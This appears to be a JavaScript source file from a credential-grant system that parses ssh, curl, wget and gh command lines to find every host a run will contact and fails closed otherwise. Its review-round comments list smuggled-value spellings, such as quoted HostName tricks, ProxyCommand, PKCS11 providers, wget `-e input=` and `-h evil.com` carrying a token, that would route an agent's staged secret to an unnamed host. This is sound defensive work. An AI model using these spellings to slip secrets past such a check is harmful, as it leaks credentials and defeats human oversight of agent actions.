const SSH_OPT_CTRL = /[\x00-\x08\x0b\x0e-\x1f\x7f]/;   // a control char that is NOT one of ssh's whitespace separators (\t \n \r \f handled by the grammar)
function readSshOpt(val) {
  const s = String(val == null ? '' : val);
  // OpenSSH strdelim_internal (misc.c, split_equals=1) — NOT a bare cut at the first `=`/space. A token runs to the next
  // whitespace / `"` / single `=`. A `"` opens a quoted run: the chars BEFORE it stay, the quote PAIR is stripped, and the
  // MATCHING quote ENDS the token — reading does NOT continue past it (`Host"Name"evil` → keyword `HostName`, then value `evil`;
  // `"HostName"evil` the same). An UNMATCHED quote ⇒ strdelim returns NULL ⇒ ssh ignores the line ⇒ we fail closed (opaque).
  // ONE `=` between tokens is consumed. An EMPTY first token (a leading `=` / ws, OR a `""`) is skipped ONCE and the NEXT token
  // is the keyword (process_config_line: `if (*keyword == '\0') keyword = strdelim(&str)`); a SECOND empty token ⇒ no keyword ⇒
  // ssh applies nothing. Pinned spelling-by-spelling against `ssh -F /dev/null -G` (the generated oracle in test-vault-run-model).
  const strdelim = (pos) => {
    if (pos >= s.length) return null;
    const old = pos; let d = pos;
    while (d < s.length && !(SSH_OPT_WS.includes(s[d]) || s[d] === '"' || s[d] === '=')) d++;
    if (d >= s.length) return { tok: s.slice(old), next: s.length };
    if (s[d] === '"') { let e = d + 1; while (e < s.length && s[e] !== '"') e++; if (e >= s.length) return { bad: true }; let n = e + 1; while (n < s.length && SSH_OPT_WS.includes(s[n])) n++; return { tok: s.slice(old, d) + s.slice(d + 1, e), next: n }; }
    const hadEq = s[d] === '='; let n = d + 1; while (n < s.length && SSH_OPT_WS.includes(s[n])) n++;
    if (!hadEq && s[n] === '=') { n++; while (n < s.length && SSH_OPT_WS.includes(s[n])) n++; }   // one `=` skipped either as this delimiter or the next char
    return { tok: s.slice(old, d), next: n };
  };
  // lane vault-use-grants round 11 (BLOCKER regression from r10): the KEYWORD is read with strdelim (above), but ssh reads the
  // VALUE with argv_split (misc.c) — a DIFFERENT grammar: a `"` TOGGLES quoting and NEVER ends the token (the matching quote is
  // stripped and the bytes on BOTH sides glue into one argument: `"box.example".evil` → `box.example.evil`, `""evil` → `evil`),
  // a `\` escapes a `"`/`'`/`\` (any other `\x` keeps the backslash), a run of unquoted whitespace separates arguments, and an
  // unterminated quote (or a `\` at the end) makes ssh REJECT the line. r10 read the value with its strdelim port, which STOPS
  // at the closing quote and threw the rest away, so a quote glued inside the value hid the real host (`HostName "box".evil`
  // read `box`, ssh dialed `box.evil`; `%` behind a quote escaped the fail-closed check). Returns the FIRST argument (HostName
  // is one host; ProxyJump a comma-list with no ws), or `bad` ⇒ opaque (fail closed). Pinned value-by-value vs `ssh -F /dev/null
  // -G` (the generated oracle's value side in test-vault-run-model; live cross-check repro/r11/ssh-o-oracle.mjs).
  const argvValue = (pos) => {
    let i = pos; while (i < s.length && (s[i] === ' ' || s[i] === '\t')) i++;   // argv_split skips leading ws
    let arg = '', quote = false;
    for (; i < s.length; i++) {
      const c = s[i];
      if (c === '\\') { const n = s[i + 1]; if (n === '"' || n === "'" || n === '\\') { arg += n; i++; } else if (n === undefined) return { bad: true }; else arg += c; }   // escape a quote/backslash, else keep the `\` and read the next char normally (a `\` at EOS ⇒ reject)
      else if (!quote && (c === ' ' || c === '\t')) break;   // unquoted ws ends THIS argument
      else if (c === '"') quote = !quote;   // a quote toggles — it never ends the token, and the pair is stripped
      else arg += c;
    }
    if (quote) return { bad: true };   // an unterminated quote ⇒ ssh rejects the line ⇒ fail closed
    return { arg };
  };
  let kw = strdelim(0);
  if (kw && kw.bad) return { opaque: true };
  if (kw && kw.tok === '') { kw = strdelim(kw.next); if (kw && kw.bad) return { opaque: true }; }   // an empty first token (leading `=` / ws / `""`) ⇒ ssh re-reads the keyword once
  const key = kw ? kw.tok.toLowerCase() : '';
  if (!key) return {};   // no keyword (a second empty token, `==HostName=`) ⇒ ssh applies nothing, nothing routes
  if (SSH_OPT_CTRL.test(key)) return { opaque: true };
  if (SSH_LOCAL_O.has(key)) return { opaque: true };
  if (SSH_OPAQUE_KW.has(key)) return { opaque: true };   // round 11 (MAJOR): CanonicalDomains / CanonicalizeHostname rewrite the host through a list the reader cannot resolve; PKCS11Provider / SecurityKeyProvider load agent-written code (a .so) with the secret in the child's env ⇒ the card, «always» withheld (a plain `-o HostName=` these are not — opaque, not a named host)
  if (SSH_HOST_OPTS.has(key)) {
    const v = argvValue(kw.next);   // the value — read with argv_split (NOT strdelim): a glued quote stays part of the host
    if (v.bad) return { opaque: true };
    const raw = v.arg;
    if (SSH_OPT_CTRL.test(raw) || /%/.test(raw)) return { opaque: true };   // a control char, or a `%h`/`%%` token ssh expands to a host we cannot name ⇒ fail closed
    return { hosts: raw.split(/[,\s]+/).filter(Boolean) };
  }
  return {};   // a non-routing keyword (User, Port, IdentityFile, …) — ssh offers «always»
}
// lane vault-use-grants round 4 (MINOR item 6): wget `-e CMD` runs ONE .wgetrc command. Only a REVIEWED, pinned set of
// NON-routing / non-credential / non-file-redirect commands is safe to let a grant stand for; every other command (input,
// *_proxy, use_proxy, post_file, load_cookies, base, certificate, private_key, header, referer, user, password, ask_password,
// use_askpass, span_hosts, …) adds a destination or carries a credential the card never named ⇒ OPAQUE.
const WGET_SAFE_E = new Set(['robots', 'timestamping', 'quiet', 'verbose', 'server_response', 'tries', 'timeout', 'dns_timeout', 'connect_timeout', 'read_timeout', 'wait', 'waitretry', 'random_wait', 'retry_connrefused', 'progress', 'show_progress', 'check_certificate', 'content_disposition', 'adjust_extension', 'continue', 'no_clobber', 'dot_style', 'content_on_error', 'trust_server_names', 'debug', 'no_verbose']);
/** An authority (no scheme) → { host, port } (userinfo dropped at the LAST `@`, IPv6 brackets handled). */
function splitAuthority(a) {
  let s = String(a == null ? '' : a).trim();
  const at = s.lastIndexOf('@'); if (at >= 0) s = s.slice(at + 1);
  if (s[0] === '[') { const j = s.indexOf(']'); if (j > 0) { const m = /^:(\d{1,5})$/.exec(s.slice(j + 1)); return { host: s.slice(1, j), port: m ? m[1] : null }; } }
  const p = s.split(':');
  if (p.length === 2 && /^\d{1,5}$/.test(p[1])) return { host: p[0], port: p[1] };
  return { host: p.length > 2 ? s : p[0], port: null };   // > 2 colons = a bare IPv6 literal
}
const schemeOff = (s) => String(s == null ? '' : s).replace(/^[a-z][a-z0-9+.-]{0,31}:\/\//i, '');
// lane vault-use-grants round 5 (MAJOR item 5): the scheme words curl 8.18 treats as a URL (its Protocols line). A positional
// whose prefix is one of these and is NOT spelled `scheme://host` — `ftp:/127.0.0.1:P/x` (one slash) or `ftp:HOST` (none) —
// is read by curl as a URL to the host after it, while the BARE reader would name the SCHEME WORD as the host; it is BLIND.
const CURL_SCHEMES = new Set(['dict', 'file', 'ftp', 'ftps', 'gopher', 'gophers', 'http', 'https', 'imap', 'imaps', 'ipfs', 'ipns', 'ldap', 'ldaps', 'mqtt', 'pop3', 'pop3s', 'rtmp', 'rtmpe', 'rtmps', 'rtmpt', 'rtmpte', 'rtmpts', 'rtsp', 'scp', 'sftp', 'smb', 'smbs', 'smtp', 'smtps', 'telnet', 'tftp', 'ws', 'wss']);
// lane vault-use-grants round 5 (BLOCKER item 1): the ssh family (ssh / scp / sftp / rsync / git-over-ssh) resolves a
// single-label host through ~/.ssh/config (`ssh -G ssh://router` prints the alias' HostName, exactly as the bare form) in
// EVERY spelling — bare `host`, `user@host`, `host:path`, `ssh://`, `scp://`, `sftp://`, `git+ssh://`, `-o HostName=`, `-F`.
// A host that is not a dotted name / an address / localhost is an ALIAS the agent can redefine ⇒ OPAQUE (the card, no «always»).
const SSH_SCHEME = /^(?:ssh|sftp|scp|git\+ssh|ssh\+git|svn\+ssh)$/i;
const sshAlias = (h) => { const x = String(h || '').toLowerCase().replace(/^\[|\]$/g, '').replace(/\.$/, ''); return !!x && x !== 'localhost' && !/[.:]/.test(x); };   // round 6 item 2: a single label (no dot = not a dotted name, no colon = not a bare IPv6), not localhost — a ONE-LETTER host is an alias too (a drive letter is a LOCAL `X:path`, read only in the scpLike branch below, NEVER a host)
/** The host of an ssh-family target positional, in EVERY spelling (scheme URI → new URL; `host:path` → before the first `:`;
 *  bare `[user@]host`), or null if the positional is not a target (a local path, a refspec). */
function sshTargetHost(p, row, win32 = false) {
  const s = String(p);
  const sm = /^([a-z][a-z0-9+.-]*):\/\//i.exec(s);
  if (sm) { if (!SSH_SCHEME.test(sm[1])) return null; try { return new URL(s).hostname || null; } catch { return null; } }   // only SSH-transport schemes resolve through ~/.ssh/config — http(s)/git:// do not
  if (row.scpLike) { const m = /^((?:[\w.+-]+@)?)(\[[0-9a-f:.]+\]|[A-Za-z0-9.-]{1,253}):(?!\/\/)/i.exec(s); if (m) return (win32 && !m[1] && /^[A-Za-z]$/.test(m[2])) ? null : m[2]; }   // round 7 item 1c: a one-letter `X:path` is a LOCAL Windows drive ONLY on a win32 runner AND only with no `user@` — `platform === 'win32' where the command RUNS` is passed IN (never process.platform read here; the hub is POSIX today). On POSIX, scp/rsync/git read `X:path`/`c:/x`/`C:\x` as host X (an alias), and `u@r:/x` is a remote host everywhere. r6's drive-letter exemption — measured wrong on Linux — is REVERSED.
  if (row.sshTarget) { const m = /^(?:[\w.+-]+@)?([A-Za-z0-9.-]{1,253})$/.exec(s); if (m) return m[1]; }
  return null;
}
/** A proxy / preproxy / socks value → its authority as the ONE parser reads it: scheme stripped, cut at the first `/`, `?` or
 *  `#` (a `#@host` / `?@host` tail is a fragment/query the tool drops, NEVER userinfo), then host[:port]. (round 5 item 5.) */
const proxyAuthority = (val) => splitAuthority(schemeOff(String(val == null ? '' : val).trim()).split(/[\/?#]/)[0]);
/** The hosts the run will CONTACT: `shape.hosts` + every routing/proxy/bare target; `opaque` when one cannot be resolved. */
function routeTargetsOf(row, kind, hosts, keyed, positionals, plainEnv, win32 = false) {
  const out = new Set(hosts), add = (h, port = null) => { const n = normHost(h, port); if (n) out.add(n); };
  let opaque = false;
  // round 6 (BLOCKER item 1): the ONE reader every host-bearing ssh option goes through — it adds the destination AND
  // applies the alias law, so a jump host (`-J`), a `-W host`, an `-o ProxyJump=`/`-o HostName=` all fail closed on an alias.
  const addSshHost = (h) => { const a = splitAuthority(String(h).trim()); if (a.host) { add(a.host, a.port); if (sshAlias(a.host)) opaque = true; } };
  if (!(row && kind === 'tool')) { for (const h of hosts) out.add(h); return { hosts: [...out].filter(Boolean), opaque }; }
  if (row.proxyEnv) for (const e of plainEnv || []) if (/^(?:https?|all|ftp)_proxy$/i.test(e.name) && String(e.value || '').trim()) opaque = true;   // a proxy env var intercepts every request — where it goes cannot be told
  for (const kv of keyed || []) {
    const i = kv.indexOf('='); const flag = kv.slice(0, i), val = kv.slice(i + 1);
    if (flag === '-x' || flag === '--proxy' || flag === '--preproxy' || flag === '--proxy1.0' || /^--socks[45]/.test(flag)) { const a = proxyAuthority(val); if (a.host) add(a.host, a.port); else if (val.trim()) opaque = true; }   // round 5 item 5: the authority is cut at the first / ? # — `host:port#@other` connects to host:port, not other
    else if (flag === '--connect-to') { const f = val.split(':'); if (f[2]) add(f[2], /^\d{1,5}$/.test(f[3] || '') ? f[3] : null); else if (val.trim()) opaque = true; }   // HOST1:PORT1:HOST2:PORT2 → connects to HOST2
    else if (flag === '--resolve') { const m = /^\+?[^:]+:\d+:(.+)$/.exec(val); if (m) for (const addr of m[1].split(',')) { const a = splitAuthority(addr.trim()); if (a.host) add(a.host); } }   // HOST:PORT:ADDR[,ADDR] → routes to ADDR
    else if (flag === '--doh-url') { const hs = urlHosts(val); if (hs.length) hs.forEach((h) => out.add(h)); else if (val.trim()) opaque = true; }
    else if (flag === '--unix-socket' || flag === '--abstract-unix-socket' || flag === '--dns-servers' || flag === '--alt-svc') { if (val.trim() || flag.includes('unix')) opaque = true; }   // a local socket / an attacker-chosen resolver / an alt route — a destination the grant can never name
    else if (flag === '-e' || flag === '--execute' || flag === '--rsh') { if (row.name === 'rsync') opaque = true; else if (!WGET_SAFE_E.has(String(val).split('=')[0].trim().toLowerCase())) opaque = true; }   // rsync -e <remote shell>; wget -e <.wgetrc cmd> opaque unless a reviewed non-routing command (round 4: -e input=FILE leaked)
    else if (flag === '-o') { const r = readSshOpt(val); if (r.opaque) opaque = true; else if (r.hosts) for (const h of r.hosts) addSshHost(h); }   // ssh -o; round 9 (BLOCKER item 2): the keyword is read by `readSshOpt` = OpenSSH's strdelim grammar (skip a leading `=`, strip a `"` pair around/inside the keyword, split at a single `=` or any whitespace), so `=ProxyCommand=…`, `"HostName" …`, `Host"Name"` and `HostName<TAB>…` all resolve to the real keyword; an unmatched quote / control char / `%`-token value ⇒ opaque (fail closed). `-F <config>` stays `config-file` — it withholds «always»; a remap of a dotted host through a config is the acknowledged ~/.ssh/config gap, open on both trees
    else if (flag === '-J') { for (const h of val.split(',')) addSshHost(h); }   // round 6 item 1: a jump host is `-o ProxyJump=` by another spelling — the SAME alias law (addSshHost)
    else if (flag === '-W') { addSshHost(val); }   // ssh -W host:port — the forwarded destination, under the alias law too
    else if (flag === '-I') opaque = true;   // round 11 (MAJOR): ssh -I <pkcs11 provider.so> dlopen()s agent-written code with the staged secret in the child's env ⇒ the card, «always» withheld (the same class as `-o PKCS11Provider=`)
    else if (flag === '-c' || flag === '--config-env') opaque = true;   // git config can set core.sshCommand / http.proxy — opaque
    else if (SSH_OPAQUE_FLAGS.has(flag)) opaque = true;   // round 7 item 1b: ssh -S/-L/-R/-D — DERIVED from SSH_OPT_TABLE, so a short flag and its `-o` long form (SSH_LOCAL_O, the same rows) are opaque together (`-o ControlPath=` ≡ `-S`)
  }
  if (/^(?:curl|wget)$/.test(row.name)) for (const p of positionals) { const t = targetOf(p, !!row.globs, row.bareHosts === 'all'); if (t.host) add(t.host); else if (t.unread) opaque = true; }   // every bare positional is a destination; a glob / numeric address is blind
  else if (/^(?:http|https|httpie)$/.test(row.name)) for (const p of httpieTarget(positionals)) { const t = targetOf(p, !!row.globs, row.bareHosts === 'all'); if (t.host) add(t.host); else if (t.unread) opaque = true; }
  // lane vault-use-grants round 5 (BLOCKER item 1): the ssh family's TARGET host is subject to the alias law in EVERY
  // spelling (`sshTargetHost` reads it from a bare `[user@]host`, a `host:path`, or an `ssh://`/`scp://`/`sftp://`/`git+ssh://`
  // URI — r4's rule wrongly exempted every `://` target, reopening `ssh ssh://router`). git: only the REMOTE (positionals[0]);
  // the rest are refspecs. A git https URL is NOT ssh (sshTargetHost returns null for it) — its host is read by urlParse.
  if (row.sshTarget && positionals.length) { const h = sshTargetHost(positionals[0], row, win32); if (h && sshAlias(h)) opaque = true; }
  if (row.scpLike) for (const p of (row.name === 'git' ? positionals.slice(0, 1) : positionals)) { const h = sshTargetHost(p, row, win32); if (h && sshAlias(h)) opaque = true; }
  return { hosts: [...out].filter(Boolean), opaque };
}
/** THE reader the card and the grant share: { hosts, opaque } — the hosts the run will CONTACT. (The seam above.) */
const destinationsOf = (shape) => ({ hosts: Array.isArray(shape.routeHosts) ? shape.routeHosts : (shape.hosts || []), opaque: !!shape.routeOpaque });

function argClassOf(a) {
  if (/\$VAULT_FILE\{/.test(a)) return '<vaultfile>';
  if (/^[a-z][a-z0-9+.-]{0,31}:\/\//i.test(a)) return '<url>';
  if (/^[+-]?\d+(?:\.\d+)?$/.test(a)) return '<number>';
  if (/[\/\\]|^[.~]/.test(a)) return '<path>';
  return '<word>';
}
// round 26 (minor): wget `-e VAR[=…]` commands that do NOT route the connection (politeness / timestamp / output verbosity) — mirrors vault-use-grants' WGET_SAFE_E. Every OTHER -e command (a proxy var: use_proxy / http(s)_proxy / ftp_proxy, or an unknown one) and every other keyed flag ROUTES (fail closed). — int361: ONE table on the train (vault-use-grants' above, unioned with this lane's words); keyRoutes reads it.
/** Does a keyed flag entry `${flag}=${value}` actually ROUTE the connection? Only a routing key withholds «always» (opaque-route) — a reviewed non-routing wget `-e robots=off` must not be told «it routes somewhere its address does not say». */
function keyRoutes(entry, row) {
  const eq = String(entry).indexOf('=');
  const f = eq >= 0 ? entry.slice(0, eq) : entry;
  const v = eq >= 0 ? entry.slice(eq + 1) : '';
  if (row && row.name === 'wget' && (f === '-e' || f === '--execute')) return !WGET_SAFE_E.has((v.split('=')[0] || '').trim().toLowerCase());   // a known non-routing wgetrc command does not route; a proxy var / an unknown one does
  return true;   // curl proxy/resolve/connect-to/socks/doh-url/dns-servers/alt-svc/interface/unix-socket, ssh -o ProxyCommand/-J, httpie --proxy, git -c, rsync -e — all route (fail closed)
}
/** planOf's answer (`run`) → its SHAPE: { v, tool, name, kind, sub, flags, args, hosts, entries, injection, env (NAME=value), keyed,
 *  templates, on, script, known, proxyEnv, always, noAlways, argvExposed }. `always` = «always» may be offered for it. */
function shapeOf(run) {
  const row = run.row, kind = run.kind, argv = run.argv, win32 = run.win32 === true;   // vault-use-grants round 7 item 1c: the platform where the command RUNS, passed IN (int361: kept beside vault-agent-own's shapeOf)
  const flags = new Set(), sub = [], args = [], positionals = [], keyed = [], valued = [];
  let script = null, afterDashes = false, valueNext = null, configFile = false, unread = false, gitDriven = false, configOpaque = false;
  const isKeyed = (f) => !!(row && (row.keyed || []).includes(f));
  const ghLead = [];   // round 5/6: gh's grammar is PER VERB — collect the LEADING non-dash words (gh wants the command first), stopping at the FIRST dash. A dash before the verb words is a flag the reader cannot place (cobra skips an unknown flag + its arg at every level and re-parses at the leaf), so no key matches ⇒ vg null ⇒ BLIND (fail closed — gh repo -d x edit evil/o/r is not read as repo edit)
  const ghDepth = row && row.grammar ? gramDepthOf(row.grammar) : 0;   // round 7 (5b): the grammar's longest key, so a 3-word verb (repo autolink create) is matched, not capped at row.sub
  if (row && row.grammar) for (const a of argv.slice(1)) { if (a[0] === '-' || ghLead.length >= ghDepth) break; ghLead.push(a); }
  let vg = null;   // the LONGEST leading key the table knows (1 word like `api`, 2 like `repo create`); null = a dash came first, or a verb the table does not carry (one that reaches no host) ⇒ the shape BLINDS below
  if (row && row.grammar) for (let n = ghLead.length; n >= 1 && !vg; n--) vg = row.grammar[ghLead.slice(0, n).join(' ')] || null;
  const takes = row ? [...(row.valueFlags || []), ...(row.hostFlags || []), ...(row.configFlags || []), ...(row.keyed || []), ...(vg && vg.value ? vg.value : [])] : [];   // the flags that take a value (+ gh's per-verb value flags)
  if (kind !== 'tool') script = JSON.stringify(argv.slice(1));
  else for (const a of argv.slice(1)) {
    if (!afterDashes && a === '--') { afterDashes = true; flags.add('--'); continue; }
    if (!afterDashes && a.length > 1 && a[0] === '-') {
      const eq = a.startsWith('--') ? a.indexOf('=') : -1, cl = a[1] !== '-' && a.length > 2 && !takes.includes(a) ? shortSplit(a, takes) : null;   // round 2: -hHOST, -oProxyCommand=…, -sSo out
      let f = eq > 0 ? a.slice(0, eq) : cl ? cl.f : a;
      const v = eq > 0 ? a.slice(eq + 1) : cl ? cl.v : null;
      if (row && row.prefixOpts && f.startsWith('--') && f.length > 2 && !takes.includes(f)) {   // round 2b: GNU/my_getopt accept any UNIQUE prefix of a long option (wget --exec, psql --hos, --comm, --fil)
        const pref = (list) => (list || []).find((t) => t.startsWith('--') && t !== f && t.startsWith(f));
        const c = pref(row.configFlags) || pref(row.scriptFlags) || pref(row.hostFlags) || pref(row.keyed) || pref(row.urlFlags) || pref(row.valueFlags);
        if (c) f = c;   // treat the abbreviation as the flag it names — its value is read (or the shape goes blind) as if spelled in full
      }
      if (row && (row.configFlags || []).includes(f)) configFile = true;
      if (row && (row.blindPrefixes || []).some((p) => f.startsWith(p))) unread = true;   // curl --expand-url https://{{H}}/ — a host made at run time
      if (v != null) { flags.add(eq > 0 ? a.slice(0, eq + 1) : cl.head); if (isKeyed(f)) keyed.push(`${f}=${v}`); else { args.push(argClassOf(v)); valued.push([f, v]); } } else flags.add(cl ? cl.head : a);
      valueNext = v == null && (takes.includes(a) || takes.includes(f) || cl) ? f : null;   // round 2b: a resolved prefix (f) takes a value too
      continue;
    }
    const wasValue = valueNext; valueNext = null;
    if (wasValue && isKeyed(wasValue)) { keyed.push(`${wasValue}=${a}`); continue; }   // a routing flag's value IS the shape (ssh -o ProxyCommand=…)
    if (wasValue) { args.push(argClassOf(a)); valued.push([wasValue, a]); continue; }
    if (row && row.sub && sub.length < row.sub && !positionals.length && /^[a-z][a-z0-9-]{0,40}$/.test(a)) { sub.push(a); continue; }
    args.push(argClassOf(a));
    positionals.push(a);
  }
  // THE HOSTS: every URL anywhere (the command, the plain env values, the templates) + the row's own rules; its defaults when none
  const hosts = new Set([...argv.slice(1), ...run.plainEnv.map((e) => e.value), ...run.files.map((f) => f.text || '')].flatMap(urlHosts));
  const routeHosts = new Set(), routeWords = [];   // round 14 (MAJOR): ONLY gh's ROUTING inputs — -R/--repo, --hostname, GH_HOST, a spec positional's host — the SEAL's host, distinct from `hosts` (the card's words; a URL in a body/title/template/env value is NOT a routing host)
  if (row && kind === 'tool') {
    const vals = (list) => valued.filter(([f]) => (list || []).includes(f)).map(([, v]) => v).filter((v) => v !== '');   // round 11 (MAJOR 3): an EMPTY value (--head= / -H "" / -R "") is ABSENT — gh falls back (pr create resolves the CWD repo + runs git status over core.fsmonitor; an empty -R uses the CWD remotes), so NO value-flag read counts it as present
    const envs = (list) => run.plainEnv.filter((e) => (list || []).includes(e.name) && e.value).map((e) => e.value);
    const many = (v) => String(v).split(',').map((h) => normHost(h.trim()));   // libpq takes a host LIST (PGHOST=h1,h2 · -h h1,h2)
    if (row.grammar && !vg) unread = true;   // round 6 (FAIL CLOSED): a KNOWN network tool (gh) at a spelling the table cannot read with certainty — a dash before the verb words (findings 1), or a verb the table does not carry: one absent because it reaches no host, or an unknown verb (finding 2) — BLINDS; the reader never models where cobra would place a flag
    if (row.scpLike) for (const a of (row.name === 'git' ? positionals.slice(0, 1) : positionals)) { const m = /^((?:[\w.+-]+@)?)([A-Za-z0-9.-]{1,253}):(?!\/\/)/.exec(a); if (m && !(win32 && !m[1] && /^[A-Za-z]$/.test(m[2]))) hosts.add(normHost(m[2])); }   // git: only the REMOTE (a refspec HEAD:main is never a host); round 7 item 1c: a one-letter `X:path` is a host on POSIX (a Windows drive only on a win32 runner with no `user@`)
    if (row.sshTarget && positionals.length) { const m = /^(?:[\w.+-]+@)?([A-Za-z0-9.-]{1,253})$/.exec(positionals[0]); if (m) hosts.add(normHost(m[1])); }
    const hostFlagList = [...(row.hostFlags || []), ...(vg && vg.host ? [vg.host] : [])];   // round 5: -h is --hostname only under the verb that defines it (gh auth status -h evil.com sends GH_ENTERPRISE_TOKEN there) — the grammar carries the per-verb short
    const defHost = (row.hosts || []).find((h) => !/^api\./i.test(h)) || (row.hosts || [])[0] || null;   // round 14: the tool's user-facing default routing host (gh: github.com, not api.github.com) — a 2-part OWNER/REPO routes there
    if (hostFlagList.length) for (const v of vals(hostFlagList)) { routeWords.push(v); if (!/^[a-z][a-z0-9+.-]{0,31}:\/\//i.test(v)) many(v).forEach((h) => { hosts.add(h); routeHosts.add(h); }); }   // -h x · --host=x · -hx (round 2); a URL value (kubectl -s https://…) is read by the top-level flatMap; round 14: a --hostname is a ROUTING host
    if (row.scriptFlags) for (const v of vals(row.scriptFlags)) if (row.escapes.test(v)) unread = true;   // round 2: a client's shell escape — where it sends is the shell's
    if (row.registry) for (const a of positionals) { const h = a.split('/')[0]; if (HOSTNAME.test(h.replace(/:\d+$/, ''))) hosts.add(normHost(h)); }
    if (row.hostEnv) for (const v of envs(row.hostEnv)) { routeWords.push(v); many(v).forEach((h) => { hosts.add(h); routeHosts.add(h); }); }   // round 14: GH_HOST is a ROUTING host
    if (row.bareHosts) for (const a of [...(row.bareHosts === 'first' ? httpieTarget(positionals) : positionals), ...vals(row.urlFlags)]) { if (String(a).startsWith('@')) { unread = true; continue; } routeWords.push(a); const t = targetOf(a, !!row.globs, row.bareHosts === 'all'); if (t.host) hosts.add(t.host); if (t.unread) unread = true; }   // round 2b: `--url @file` / `@urls.txt` reads the real targets from a file
    if (row.conninfo) for (const a of [...argv.slice(1), ...vals(['-d', '--dbname'])]) { conninfoHosts(a).forEach((h) => hosts.add(h)); if (conninfoUriBlind(a)) unread = true; }
    const repoSpec = vg && vg.spec ? positionals : [];   // round 5/7: a `spec` verb reads EVERY positional (repo view's <repository>, repo create's <name>, issue transfer's SECOND positional <destination-repo>)
    const repoVals = vg && vg.repoValues ? vals(vg.repoValues) : [];   // round 6/7: every value the help TYPEs OR DESCRIBES as a repository (the inherited -R, repo create --template, issue develop --branch-repo)
    if (row.repoFlags) for (const v of [...vals(row.repoFlags), ...envs(row.repoEnv), ...repoSpec, ...repoVals]) { routeWords.push(v); const h = repoHostOf(v); if (h) { hosts.add(h); routeHosts.add(h); } else if (h === '') unread = true; else if (/^[A-Za-z0-9._-]+\/[A-Za-z0-9._-]+$/.test(String(v).trim())) routeHosts.add(defHost); }   // round 14: a repo spec's HOST is a ROUTING host (a clean 2-part OWNER/REPO ⇒ the default host)   // round 7 (BLOCKER 2): repoHostOf reads every form go-gh accepts (the scp-like git@HOST:O/R + ssh/https URLs incl.); a 2-part OWNER/REPO ⇒ the default host; a 3-part spec with an unreadable host ⇒ blind
    if (row.urlArgSubs && row.urlArgSubs.some((b) => b.every((w, i) => ghLead[i] === w))) { const ep = positionals[0]; if (ep != null) { routeWords.push(ep); urlHosts(ep).forEach((h) => routeHosts.add(h)); if (urlHostsBad(ep)) routeHosts.add(null); } }   // a full-URL endpoint is a ROUTE host; a path falls to the default host via the !routeHosts default below (gh api --hostname evil keeps evil only)   // round 15 (MAJOR): gh api <endpoint> — a full-URL positional is the host gh contacts (a ROUTE host); a path routes to the default host
    if (vg && vg.urlArg) for (const p of positionals) { routeWords.push(p); urlHosts(p).forEach((h) => routeHosts.add(h)); if (urlHostsBad(p)) routeHosts.add(null); }   // round 16 (BLOCKER): a verb whose POSITIONAL may be a URL (`<url>` in its usage — issue view/close/comment, pr view/checks/comment; DERIVED from the live help, never hand-picked) CONTACTS that URL's host — a ROUTE host whatever syntax carries it; a URL host that DIFFERS from the -R / GH_HOST host is TWO route hosts ⇒ the door refuses two_hosts (never sends GH_ENTERPRISE_TOKEN to the URL's host silently)
    if (row.blindSubs && row.blindSubs.some((b) => b.every((w, i) => sub[i] === w))) { unread = true; gitDriven = true; }   // round 2b: a subcommand that drives git (gh repo clone / pr checkout) — the project's config / hooks decide where it goes
    if (row.blindFlagSubs) for (const b of row.blindFlagSubs) if (b.sub.every((w, i) => sub[i] === w) && boolFlagOn(argv, b.longs || [], b.shorts || [], vg)) { unread = true; gitDriven = true; }   // round 3/4/5: a verb that drives git only with a bool flag (gh pr merge --delete-branch/-d, repo create --push/--clone/-c) — boolFlagOn matches every pflag spelling (long, =true not =false, a short alone or in a cluster, -x=true); round 5: a cluster's =value binds to the LAST letter only (the grammar says which letters take a value)
    if (vg && vg.launch && boolFlagOn(argv, vg.launch.filter((f) => f.startsWith('--')), vg.launch.filter((f) => /^-[A-Za-z]$/.test(f)), vg)) unread = true;   // round 10 (BLOCKER 1a): an allowlisted verb with --web/-w or --editor/-e opens a launcher gh resolves from its config file's browser:/editor: key or exec.LookPath on the child's PATH, with the minted value in that program's env — BLIND (the card asks); the launch set is GENERATED per verb from the help and help-hash pinned
    if (row.needFlagSubs) for (const b of row.needFlagSubs) if (b.sub.every((w, i) => sub[i] === w) && !(vals(b.need).length && (!b.repo || vals(row.repoFlags || []).length || envs(row.repoEnv || []).length))) { unread = true; gitDriven = true; }   // round 10 (MAJOR 2): gh pr create resolves the CWD repo (git status over core.fsmonitor) and PUSHES the head (git push over the repo's pre-push hook / core.hooksPath) UNLESS --head names the branch AND -R (or GH_REPO) names the repo — every other shape BLINDS (gh then touches no local git)
    if (row.fileFlags) for (const [f, v] of valued) if (row.fileFlags.includes(f) && !fileFlagExempt(f, v, run)) { configFile = true; configOpaque = true; }   // round 17 (item 1): a cert / cookie FILE is opaque — never shown, so «always» stays off even beside a shown config template; round 3/4: a cert / config FILE the agent can write ⇒ config class — blind unless the WHOLE value is a $VAULT_FILE placeholder (fileFlagExempt) for an owner-store entry (a template / an agent-put entry / a substring blinds)
    if (row.passDashes && flags.has('--')) { unread = true; gitDriven = true; }   // round 2b: gh passes args after `--` to git
    if ([...argv.slice(1), ...run.plainEnv.map((e) => e.value), ...run.files.map((f) => f.text || '')].some(blindAuthority)) unread = true;   // round 2b (HIGH-1): a URL authority our host read cannot be trusted for
    if (!hosts.size && row.hosts) row.hosts.forEach((h) => hosts.add(h));
    if (!row.freeText) for (const h of hosts) routeHosts.add(h);   // round 15 (MAJOR): the ONE host set — a tool WITHOUT free-text value flags (every tool but gh) CONTACTS every host it names, so every mentioned host is a route; gh (freeText) carries URLs in --body/--title/templates it never contacts, so its routeHosts is built ONLY from its routing inputs above (-R/--hostname/GH_HOST/a repo spec/gh api <url>)
    if (!routeHosts.size && defHost) routeHosts.add(defHost);   // when the command names no routing input at all, the tool's default routing host (gh: github.com)
  }
  if (!(row && kind === 'tool')) for (const h of hosts) routeHosts.add(h);   // round 16 (MAJOR): a tool WITHOUT a row (a shell, an interpreter, an unknown binary) contacts every host it names — the card/audit name it, never «unknown». The freeText rule applies only to rows that declare it (gh)
  const badHost = routeHosts.has(null);   // round 16 (MINOR): a routing value named a host that did not parse (psql -h ,db.example.com → many() → null); the door refuses bad_host, never lets «sends it to null» reach the verdict
  routeHosts.delete(null);
  hosts.delete(null);
  const rowHosts = new Set((row && row.hosts) || []);   // round 16 (MINOR): a row's OWN default hosts (gh: api.github.com) are NEVER a «mention» — the row defaults are route hosts; a Mentions line names only a FREE-TEXT host (a --body / --title / template URL) that is not a route
  const mentions = [...hosts].filter((h) => h && !routeHosts.has(h) && !rowHosts.has(h)).sort();
